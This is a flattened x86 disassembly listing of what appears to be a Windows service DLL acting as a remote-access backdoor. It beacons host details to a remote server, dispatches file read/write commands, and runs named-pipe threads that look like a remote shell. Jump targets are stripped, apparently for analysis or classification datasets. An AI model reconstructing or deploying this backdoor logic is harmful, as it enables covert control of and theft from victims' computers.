sub_100010a8
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
push 0x1
pop eax
retn 0xc
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi 0x104
push edi
push esi
mov edi rw-data
push 0x0
push edi
mov [ rw-data ] ebx
call memset
add esp 0xc
push esi
push edi
push ebx
call [ GetModuleFileNameA@IAT ]
mov ebp 0x42c
mov esi rw-data
push ebp
push 0x0
push esi
mov [ rw-data ] eax
call memset
add esp 0xc
mov ebx rw-data
mov ecx rw-data
push 0x10
push ebx
push edi
call sub_1000447c
push 0x1
push 0x10
push ebx
push ebp
push esi
push esi
mov ecx rw-data
call sub_1000459f
pop edi
pop esi
pop ebp
pop ebx
ServiceMain
mov eax sub_10004f51
call _EH_prolog
sub esp 0x10c
lea eax [ esp + 0xc ]
push esi
mov esi [ esp + 0x128 ]
push edi
mov edi 0x100
push edi
push [ esi ]
push eax
call [ strncpy@IAT ]
push edi
lea eax [ esp + 0x24 ]
push [ esi ]
push eax
call [ wcstombs@IAT ]
add esp 0x18
lea eax [ esp + 0x14 ]
push sub_10001427
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
xor esi esi
mov [ rw-data ] eax
cmp eax esi
je r-xdata
mov ecx [ esp + 0x114 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push ebx
push ebp
push 0x1
push esi
push 0x2
call sub_100013df
mov ebx [ Sleep@IAT ]
add esp 0xc
mov ebp 0x3e8
push ebp
call ebx
mov edi [ CreateEventA@IAT ]
push esi
push esi
push 0x1
push esi
call edi
push esi
push esi
push 0x1
push esi
mov [ rw-data ] eax
call edi
push esi
push esi
push 0x1
push esi
mov [ rw-data ] eax
call edi
push esi
push esi
push 0x1
push esi
mov [ rw-data ] eax
call edi
push esi
push esi
push 0x1
push esi
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
call [ WSACreateEvent@IAT ]
mov [ rw-data ] eax
xor eax eax
lea edi [ esp + 0x14 ]
push esi
stosd [ edi ]
mov eax [ rw-data ]
push esi
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
push 0x4
mov [ esp + 0x20 ] eax
call sub_100013df
add esp 0xc
push 0x1c
push esi
push rw-data
call memset
add esp 0xc
fld [ r--data ]
push ecx
push ecx
fstp [ esp ]
push 0x1
call sub_10002368
add esp 0xc
push eax
call ebx
jmp r-xdata
push 0x40
call ??2@YAPAXI@Z
pop ecx
mov [ esp + 0x18 ] eax
cmp eax esi
mov [ esp + 0x124 ] esi
je r-xdata
fld [ rw-data ]
push ecx
push ecx
fstp [ esp ]
push esi
call sub_10002368
fld [ rw-data ]
add esp 0x4
mov [ rw-data ] esi
fstp [ esp ]
push esi
call sub_10002368
add esp 0xc
push eax
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
call sub_1000184b
test eax eax
jne r-xdata
xor eax eax
mov ecx eax
call sub_10003026
jmp r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
push ebp
call ebx
push [ rw-data ]
call [ SetEvent@IAT ]
cmp eax 0x1
je r-xdata
mov [ rw-data ] eax
mov [ eax ] sub_10001a91
mov eax [ rw-data ]
or [ esp + 0x124 ] 0xffffffff
push esi
push esi
mov [ eax + 0x4 ] sub_10001f50
mov eax [ rw-data ]
push esi
push sub_100014ad
mov [ eax + 0x8 ] sub_1000459e
mov eax [ rw-data ]
push esi
push esi
mov [ eax + 0xc ] esi
mov eax [ rw-data ]
mov [ eax + 0x10 ] sub_1000188e
call [ _beginthreadex@IAT ]
add esp 0x18
mov [ rw-data ] eax
lea eax [ esp + 0x10 ]
push 0xffffffff
push esi
push eax
push 0x2
call [ WaitForMultipleObjects@IAT ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
mov [ rw-data ] esi
je r-xdata
push esi
mov ecx edi
call sub_100040ca
push edi
call ??3@YAXPAX@Z
pop ecx
push ebp
call ebx
cmp eax 0x102
je r-xdata
call sub_10001ccd
call [ WSACleanup@IAT ]
pop ebp
pop ebx
jmp r-xdata
push 0x2
push [ rw-data ]
call [ shutdown@IAT ]
push [ rw-data ]
call [ closesocket@IAT ]
mov edi [ rw-data ]
cmp edi esi
je r-xdata
cmp eax 0xffffffff
jne r-xdata
push [ rw-data ]
mov edi [ ResetEvent@IAT ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
cmp [ rw-data ] 0x1
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
sub_100013df
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ rw-data ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x10
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x14 ] 0x7
push [ rw-data ]
mov [ ebp - 0x4 ] 0xbb8
call [ SetServiceStatus@IAT ]
leave
retn
sub_10001427
mov eax [ esp + 0x4 ]
push esi
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x3
call sub_100013df
add esp 0xc
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x2710
call [ Sleep@IAT ]
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x6
call sub_100013df
push esi
push esi
push 0x7
jmp r-xdata
dec eax
je r-xdata
call sub_100013df
add esp 0x18
jmp r-xdata
xor esi esi
push 0x1
push esi
push 0x5
call sub_100013df
push esi
push esi
push 0x4
dec eax
je r-xdata
pop esi
retn 0x4
xor esi esi
push esi
push esi
push [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
call sub_100013df
add esp 0xc
xor esi esi
jmp r-xdata
push esi
push esi
push 0x1
sub_100014ad
sub esp 0x3c
push ebx
push ebp
push esi
push edi
push 0x7
xor ebx ebx
pop ecx
xor eax eax
lea edi [ esp + 0x2d ]
mov [ esp + 0x2c ] bl
[ edi ]
stosw [ edi ]
mov ebp [ WaitForSingleObject@IAT ]
mov [ esp + 0x10 ] ebx
stosb [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x14 ] eax
mov eax [ rw-data ]
mov [ esp + 0x18 ] eax
xor edi edi
fld [ r--data ]
push ecx
push ecx
fstp [ esp ]
push 0x1
call sub_10002368
add esp 0xc
push eax
push [ rw-data ]
call ebp
test eax eax
je r-xdata
mov esi rw-data
push esi
call strlen
push eax
lea eax [ esp + 0x34 ]
push esi
mov esi [ _strnicmp@IAT ]
push eax
call esi
add esp 0x10
test eax eax
je r-xdata
push esi
call [ gethostbyname@IAT ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x3c
retn 0x4
jmp r-xdata
fld [ r--data ]
push ecx
push ecx
fstp [ esp ]
push 0x1
call sub_10002368
add esp 0xc
push eax
push [ rw-data ]
call ebp
test eax eax
je r-xdata
push rw-data
call strlen
push eax
lea eax [ esp + 0x34 ]
push rw-data
push eax
call esi
add esp 0x10
test eax eax
je r-xdata
inc edi
cmp edi 0x2
jl r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
mov esi eax
push 0x20
lea eax [ esp + 0x30 ]
push ebx
push eax
call memset
lea eax [ esp + 0x38 ]
push esi
push eax
call strcpy
add esp 0x14
push ebx
push ebx
push ebx
push 0x6
push 0x1
push 0x2
call [ WSASocketA@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push [ rw-data ]
call [ closesocket@IAT ]
push rw-data
mov [ esp + 0x20 ] 0x2
call [ atoi@IAT ]
pop ecx
push eax
call [ htons@IAT ]
mov [ esp + 0x1e ] ax
lea eax [ esp + 0x2c ]
push eax
call [ inet_addr@IAT ]
mov [ esp + 0x20 ] eax
mov eax edi
shl eax 0x5
lea esi [ eax + rw-data ]
lea eax [ esp + 0x2c ]
push esi
push eax
call strcpy
pop ecx
lea eax [ esp + 0x30 ]
pop ecx
push eax
call [ inet_addr@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ rw-data ]
mov [ esp + 0x14 ] ebx
call [ closesocket@IAT ]
jmp r-xdata
lea eax [ esp + 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
push 0x23
push [ rw-data ]
push [ rw-data ]
call [ WSAEventSelect@IAT ]
push ebx
push ebx
push ebx
push sub_100018b0
push ebx
push ebx
call [ _beginthreadex@IAT ]
mov esi [ ResetEvent@IAT ]
add esp 0x18
mov [ rw-data ] eax
push [ rw-data ]
call esi
mov ecx [ rw-data ]
lea eax [ esp + 0x2c ]
push 0xc0
push eax
call sub_1000303a
push 0x7530
lea eax [ esp + 0x18 ]
push ebx
push eax
push 0x2
call [ WaitForMultipleObjects@IAT ]
sub eax ebx
je r-xdata
call [ WSAGetLastError@IAT ]
cmp edi 0x2
jne r-xdata
dec eax
je r-xdata
fld [ r--data ]
push ecx
push ecx
fstp [ esp ]
push 0x1
call sub_10002368
add esp 0xc
push eax
push [ rw-data ]
call ebp
test eax eax
je r-xdata
xor edi edi
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
call sub_10001b59
push ebx
push ebx
push ebx
push sub_100017ab
push ebx
push ebx
call [ _beginthreadex@IAT ]
add esp 0x18
mov [ rw-data ] eax
jmp r-xdata
sub eax 0x101
jne r-xdata
jmp r-xdata
inc [ esp + 0x10 ]
cmp [ esp + 0x10 ] 0x3
jg r-xdata
push [ rw-data ]
call [ closesocket@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
fld [ r--data ]
push ecx
push ecx
fstp [ esp ]
push 0x1
call sub_10002368
add esp 0xc
push eax
push [ rw-data ]
call ebp
test eax eax
je r-xdata
push [ rw-data ]
call esi
mov [ esp + 0x10 ] 0x3
jmp r-xdata
sub_100017ab
sub esp 0xc
push ebx
push ebp
push esi
push edi
xor eax eax
lea edi [ esp + 0x11 ]
stosd [ edi ]
stosd [ edi ]
mov ebx [ GetTickCount@IAT ]
mov ebp 0x2710
stosw [ edi ]
stosb [ edi ]
mov [ esp + 0x14 ] 0x6
mov [ esp + 0x10 ] 0x8
mov edi rw-data
mov esi rw-data
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn 0x4
call ebx
sub eax [ rw-data ]
push eax
call abs
cmp eax ebp
pop ecx
jbe r-xdata
push ebp
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov ecx edi
call sub_10004a44
push [ esp + 0x10 ]
mov ecx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
call sub_100038ee
mov ecx edi
call sub_10004a4c
mov ecx esi
call sub_10004a44
call ebx
mov ecx esi
mov [ rw-data ] eax
call sub_10004a4c
jmp r-xdata
sub_1000184b
push ebp
mov ebp esp
sub esp 0x190
push esi
mov esi [ WSAStartup@IAT ]
push edi
lea eax [ ebp - 0x190 ]
mov edi 0x202
push eax
push edi
call esi
test eax eax
je r-xdata
push 0x1
pop eax
call [ WSACleanup@IAT ]
lea eax [ ebp - 0x190 ]
push eax
push edi
call esi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_100018b0
push ebp
mov ebp esp
sub esp 0x30
push ebx
mov ebx [ WSAResetEvent@IAT ]
push esi
push edi
xor esi esi
push 0x3e8
call [ Sleep@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push esi
push 0xbb8
push esi
push rw-data
push 0x1
call [ WSAWaitForMultipleEvents@IAT ]
cmp eax 0x102
je r-xdata
push [ rw-data ]
call ebx
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
push esi
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
push 0x2c
lea eax [ ebp - 0x30 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x30 ]
push eax
push [ rw-data ]
push [ rw-data ]
call [ WSAEnumNetworkEvents@IAT ]
push [ rw-data ]
call ebx
test [ ebp - 0x30 ] 0x1
je r-xdata
test [ ebp - 0x30 ] 0x2
je r-xdata
mov edi [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
push eax
push 0x4004667f
push [ rw-data ]
mov [ ebp - 0x4 ] esi
call [ ioctlsocket@IAT ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
test [ ebp - 0x30 ] 0x20
je r-xdata
push [ ebp - 0x28 ]
push esi
call sub_10001a61
jmp r-xdata
push edi
push esi
call sub_100019aa
jmp r-xdata
push [ ebp - 0x18 ]
push esi
call sub_10001a6e
pop ecx
pop ecx
jmp r-xdata
sub_100019aa
mov eax sub_10004f5c
call _EH_prolog
push ecx
mov eax 0x2004
call sub_10002e90
push ebx
push esi
push edi
mov esi 0x2004
mov [ ebp - 0x10 ] esp
push esi
lea eax [ ebp - 0x2014 ]
push 0x0
push eax
call memset
lea eax [ ebp - 0x2014 ]
push esi
push eax
push [ rw-data ]
call sub_1000189b
mov esi rw-data
add esp 0x18
mov ecx esi
mov edi eax
call sub_10004a44
call [ GetTickCount@IAT ]
mov ecx esi
mov [ rw-data ] eax
call sub_10004a4c
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
test edi edi
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi rw-data
mov ecx esi
call sub_10004a44
mov ecx [ rw-data ]
lea eax [ ebp - 0x2014 ]
push edi
push eax
call sub_10003ae2
mov ecx esi
call sub_10004a4c
sub_10001a91
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ ResetEvent@IAT ]
push [ rw-data ]
mov esi rw-data
mov ecx esi
call sub_10004a44
call [ GetTickCount@IAT ]
mov ecx esi
mov [ rw-data ] eax
call sub_10004a4c
mov al 0x1
push 0x0
push esi
push [ esp + 0x14 ]
push [ rw-data ]
call [ send@IAT ]
cmp eax 0xffffffff
jne r-xdata
test eax eax
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
add [ esp + 0xc ] eax
sub esi eax
jmp r-xdata
fld [ r--data ]
mov [ rw-data ] 0x1
push 0xea60
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
test esi esi
jle r-xdata
pop edi
pop esi
retn
fld [ r--data ]
mov [ rw-data ] 0x1
jmp r-xdata
push [ rw-data ]
jmp r-xdata
push [ rw-data ]
fstp [ rw-data ]
call [ SetEvent@IAT ]
xor al al
jmp r-xdata
call edi
sub_10001b59
push ebp
mov ebp esp
mov eax 0x2090
call sub_10002e90
push esi
mov esi 0x2004
push esi
lea eax [ ebp - 0x2090 ]
push 0x0
push eax
call memset
push [ r--data ]
and [ ebp - 0x208c ] 0x0
call strlen
push eax
lea eax [ ebp - 0x2088 ]
push [ r--data ]
push eax
call memcpy
push [ r--data ]
call strlen
mov ecx [ rw-data ]
add esp 0x20
add eax 0x8
mov [ ebp - 0x2090 ] eax
push eax
lea eax [ ebp - 0x2090 ]
push eax
call sub_100038ee
push esi
lea eax [ ebp - 0x2090 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x8c ]
push 0x80
push eax
call [ gethostname@IAT ]
lea eax [ ebp - 0x8c ]
push eax
call [ gethostbyname@IAT ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
mov esi eax
lea eax [ ebp - 0x8c ]
push eax
mov [ ebp - 0x208c ] 0x8
call strlen
push eax
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x2088 ]
push eax
call memcpy
push esi
call strlen
push eax
lea eax [ ebp - 0x2068 ]
push esi
push eax
call memcpy
add esp 0x20
mov [ ebp - 0x2038 ] 0x9c
push 0x1
pop eax
mov [ ebp - 0x2048 ] eax
mov [ ebp - 0x2040 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x203c ] eax
lea eax [ ebp - 0x2038 ]
push eax
call [ GetVersionExA@IAT ]
test eax eax
pop esi
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetSystemPowerStatus
test eax eax
jne r-xdata
or [ ebp - 0x1f9d ] 0xff
xor eax eax
cmp [ ebp - 0xb ] 0x80
sete al
inc eax
mov [ ebp - 0x2044 ] eax
and [ ebp - 0x2044 ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov eax 0xf4
mov [ ebp - 0x2090 ] eax
push eax
lea eax [ ebp - 0x2090 ]
push eax
call sub_100038ee
leave
retn
sub_10001ccd
push esi
push [ rw-data ]
call [ closesocket@IAT ]
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
and [ rw-data ] 0x0
call [ WSACloseEvent@IAT ]
pop esi
retn
sub_10001d1d
mov eax sub_10004f74
call _EH_prolog
mov eax 0x22a4
call sub_10002e90
push ebx
push esi
push edi
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x1a7 ]
mov [ ebp - 0x1a8 ] bl
push 0x40
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x2ab ]
mov [ ebp - 0x2ac ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x2004
lea eax [ ebp - 0x22b0 ]
push ebx
push eax
call memset
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x2ac ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
lea eax [ edi + 0x8 ]
push rw-data
push eax
call [ sscanf@IAT ]
add esp 0x1c
lea eax [ ebp - 0x1a8 ]
lea ecx [ ebp - 0xa4 ]
push 0x1
push 0x21
push eax
call [ std::basic_fstream<char,struct std::char_traits<char> >::basic_fstream<char,struct std::char_traits<char> >@IAT ]
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] ebx
mov esi rw-data
mov eax [ eax + 0x4 ]
mov eax [ ebp + eax - 0xa0 ]
test al 0x6
je r-xdata
mov eax [ edi + 0x4 ]
sub esp 0x18
mov edi esp
mov [ ebp - 0x10 ] esp
mov [ edi ] eax
mov eax [ std::_Fpz@IAT ]
mov ecx [ eax ]
mov [ edi + 0x8 ] ecx
lea ecx [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ edi + 0xc ] eax
call [ std::_Lockit::_Lockit@IAT ]
mov eax [ rw-data ]
lea ecx [ ebp - 0x10 ]
mov [ edi + 0x10 ] eax
call [ std::_Lockit::~_Lockit@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
mov [ ebp - 0x22ac ] 0x4
mov edi 0x1ffc
or [ ebp - 0x22a4 ] 0xffffffff
mov ecx esi
mov [ ebp - 0x22ac ] 0x3
mov [ ebp - 0x22a8 ] 0x2
mov [ ebp - 0x22b0 ] 0x10
call sub_10004a44
push [ ebp - 0x22b0 ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x22b0 ]
push eax
call sub_100038ee
mov ecx esi
call sub_10004a4c
push edi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push ebx
call [ _endthreadex@IAT ]
pop ecx
or [ ebp - 0x22a4 ] 0xffffffff
mov ecx esi
mov [ ebp - 0x22ac ] 0x3
mov [ ebp - 0x22a8 ] 0x4
mov [ ebp - 0x22b0 ] 0x10
call sub_10004a44
push [ ebp - 0x22b0 ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x22b0 ]
push eax
call sub_100038ee
mov ecx esi
call sub_10004a4c
push [ ebp + 0x8 ]
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call [ std::basic_fstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov eax [ ebp - 0xa0 ]
mov ecx esi
add eax 0x8
mov [ ebp - 0x22b0 ] eax
call sub_10004a44
push [ ebp - 0x22b0 ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x22b0 ]
push eax
call sub_100038ee
mov ecx esi
call sub_10004a4c
jmp r-xdata
lea eax [ ebp - 0x22a8 ]
push edi
push eax
lea ecx [ ebp - 0xa4 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
cmp [ ebp - 0xa0 ] ebx
je r-xdata
sub_10001f50
push ebp
mov ebp esp
sub esp 0x11c
test [ rw-data ] 0x1
push ebx
push esi
push edi
jne r-xdata
mov esi rw-data
or [ rw-data ] 0x1
mov esi rw-data
push 0x1
mov ecx esi
call [ std::basic_fstream<char,struct std::char_traits<char> >::basic_fstream<char,struct std::char_traits<char> >@IAT ]
push sub_10002350
call sub_10002e42
pop ecx
jmp r-xdata
sub eax 0xc
je r-xdata
je r-xdata
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x11b ]
mov [ ebp - 0x11c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
cmp eax 0xa
jg r-xdata
call sub_100028a1
dec eax
je r-xdata
add edi 0x8
push edi
push rw-data
call strcpy
pop ecx
pop ecx
push [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
add edi 0x8
push edi
call sub_10002953
jmp r-xdata
dec eax
je r-xdata
call [ SetEvent@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
push sub_100023d8
jmp r-xdata
dec eax
je r-xdata
pop ecx
jmp r-xdata
call sub_10002c52
jmp r-xdata
dec eax
dec eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
call [ _beginthreadex@IAT ]
add esp 0x18
jmp r-xdata
mov eax [ edi + 0x8 ]
sub eax ebx
je r-xdata
dec eax
je r-xdata
add edi 0x8
push edi
call sub_10002aa1
push 0x8
mov [ edi + 0x4 ] 0x9
pop eax
mov [ edi ] eax
jmp r-xdata
mov esi rw-data
lea eax [ ebp - 0x11c ]
push esi
push eax
add edi 0x10
push rw-data
push edi
call [ sscanf@IAT ]
add esp 0x10
mov ecx rw-data
push 0x2a
push esi
call [ std::basic_fstream<char,struct std::char_traits<char> >::open@IAT ]
push 0x2004
mov edi rw-data
push ebx
push edi
call memset
mov eax [ rw-data ]
add esp 0xc
mov eax [ eax + 0x4 ]
test [ eax + rw-data ] 0x6
je r-xdata
push 0x2
pop edi
sub eax edi
je r-xdata
mov eax [ edi + 0x8 ]
sub eax ebx
je r-xdata
dec eax
je r-xdata
push eax
push edi
push 0x2
push ebx
mov ebx rw-data
mov ecx ebx
call [ std::basic_ostream<char,struct std::char_traits<char> >::seekp@IAT ]
lea eax [ ebp - 0x18 ]
mov ecx ebx
push eax
call [ std::basic_ostream<char,struct std::char_traits<char> >::tellp@IAT ]
mov ecx [ eax + 0x8 ]
add ecx [ eax ]
lea eax [ ebp - 0x11c ]
push eax
mov [ rw-data ] 0x2
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
call strlen
inc eax
push eax
lea eax [ ebp - 0x11c ]
push eax
push rw-data
call [ strncpy@IAT ]
lea eax [ ebp - 0x11c ]
push eax
call strlen
mov ecx [ rw-data ]
add esp 0x14
add eax 0x11
push eax
push edi
mov [ rw-data ] eax
call sub_100038ee
mov eax [ rw-data ]
push esi
add eax 0x8
push eax
call strcpy
pop ecx
jmp r-xdata
or [ rw-data ] 0xffffffff
push 0x10
pop eax
mov [ rw-data ] 0x2
mov [ rw-data ] 0x3
mov [ rw-data ] eax
mov ecx esi
call [ std::basic_fstream<char,struct std::char_traits<char> >::close@IAT ]
jmp r-xdata
sub eax edi
je r-xdata
push 0x10c
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ rw-data ] eax
mov [ eax ] ebx
mov esi rw-data
lea eax [ ebp - 0x11c ]
push esi
add edi 0x10
push eax
push rw-data
push edi
call [ sscanf@IAT ]
mov eax [ rw-data ]
push edi
add eax 0x8
push eax
call strcpy
or [ rw-data ] 0xffffffff
push esi
mov [ rw-data ] 0x3
mov [ rw-data ] 0x1
call strlen
inc eax
push eax
push esi
push rw-data
call [ strncpy@IAT ]
push esi
call strlen
add esp 0x2c
add eax 0x11
mov [ rw-data ] eax
push eax
push rw-data
jmp r-xdata
dec eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
dec eax
jne r-xdata
mov ecx esi
call [ std::basic_fstream<char,struct std::char_traits<char> >::close@IAT ]
mov ecx [ rw-data ]
or [ rw-data ] 0xffffffff
push 0x10
mov [ rw-data ] edi
pop eax
mov edi rw-data
push eax
push edi
mov [ rw-data ] 0x4
mov [ rw-data ] eax
call sub_100038ee
mov esi rw-data
push esi
call strlen
push eax
push ebx
push esi
call memset
push 0x2004
push ebx
push edi
call memset
add esp 0x1c
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov ecx [ rw-data ]
call sub_100038ee
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ edi + 0xc ]
push ebx
push ebx
mov [ ecx + 0x4 ] eax
push [ rw-data ]
push sub_10001d1d
push [ rw-data ]
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x2004
push ebx
push rw-data
call memset
add esp 0xc
jmp r-xdata
mov eax [ edi ]
add edi 0x8
sub eax 0x8
mov ecx rw-data
push eax
push edi
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
jmp r-xdata
add edi 0x8
push edi
call [ atof@IAT ]
fst [ rw-data ]
fcomp [ r--data ]
pop ecx
fnstsw ax
sahf
jne r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] 0x1
call sub_1000372d
push [ rw-data ]
fld [ r--data ]
fstp [ rw-data ]
sub_10002368
fld [ esp + 0x8 ]
fmul [ r--data ]
push esi
call _ftol
mov esi eax
test esi esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov esi 0xe10
mov eax esi
imul eax eax 0x3e8
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
xor edx edx
div esi
mov eax edx
imul eax eax 0x3e8
imul esi esi 0x3e8
pop esi
retn
test eax eax
jne r-xdata
add eax 0x7530
jmp r-xdata
push 0xa
mov eax esi
xor edx edx
pop ecx
div ecx
lea ecx [ eax + eax * 2 ]
cmp ecx esi
jae r-xdata
sub_100023d8
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_10002711
mov eax [ rw-data ]
mov esi [ CreateThread@IAT ]
mov [ rw-data ] eax
lea eax [ ebp - 0x4 ]
xor edi edi
push eax
mov ebx rw-data
push edi
push ebx
push sub_10002544
lea eax [ ebp - 0x10 ]
push edi
push eax
mov [ ebp - 0x10 ] 0xc
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
call esi
cmp eax edi
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x4 ]
push eax
push edi
push ebx
push sub_10002664
lea eax [ ebp - 0x10 ]
push edi
push eax
call esi
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
push 0xffffffff
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x20 ]
push edi
push eax
push 0x4
mov [ ebp - 0x20 ] ecx
call [ WaitForMultipleObjects@IAT ]
sub eax edi
je r-xdata
push edi
push [ rw-data ]
call [ TerminateThread@IAT ]
jmp r-xdata
push edi
push [ rw-data ]
dec eax
je r-xdata
push edi
push [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
call [ TerminateThread@IAT ]
mov esi [ TerminateThread@IAT ]
push edi
push [ rw-data ]
call esi
push edi
push [ rw-data ]
call esi
jmp r-xdata
dec eax
jne r-xdata
push [ rw-data ]
mov ebx [ DisconnectNamedPipe@IAT ]
call ebx
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
push [ rw-data ]
call ebx
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push 0x1c
push edi
push rw-data
call memset
add esp 0xc
mov esi [ TerminateThread@IAT ]
push edi
push [ rw-data ]
call esi
push edi
push [ rw-data ]
call esi
jmp r-xdata
push 0x1
push [ rw-data ]
call [ TerminateProcess@IAT ]
sub_10002544
push ebp
mov ebp esp
sub esp 0x820
push ebx
push esi
push edi
xor ebx ebx
push 0x1c
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x8 ] ebx
call [ malloc@IAT ]
push 0x1c
mov edi eax
push [ ebp + 0x8 ]
push edi
call memcpy
mov esi 0x3fc
lea eax [ ebp - 0x404 ]
push esi
push ebx
push eax
call memset
add esp 0x1c
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
push 0x1f4
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x404 ]
push esi
push eax
push [ edi ]
call [ ReadFile@IAT ]
push 0x41a
lea eax [ ebp - 0x820 ]
push ebx
push eax
call memset
add esp 0xc
xor eax eax
cmp [ ebp - 0x8 ] ebx
mov [ ebp + 0x8 ] eax
jbe r-xdata
